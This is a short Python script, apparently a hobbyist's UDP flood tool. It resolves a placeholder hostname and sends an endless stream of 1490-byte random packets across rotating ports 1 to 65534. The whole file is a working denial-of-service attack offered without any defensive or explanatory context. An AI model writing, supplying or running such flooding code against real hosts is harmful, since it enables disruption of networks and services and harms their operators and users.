# DAVIDRVU - 2020

import sys
import os
import time
import socket
import random

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    url   = "xxxxxxxxxxxxxxxxxxxx.xx"

    ip   = socket.gethostbyname(url)
    port = 8080

    print("url  = " + str(url))
    print("ip   = " + str(ip))
    print("port = " + str(port))

    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
        if port == 65534:
            port = 1

if __name__ == "__main__":
    main()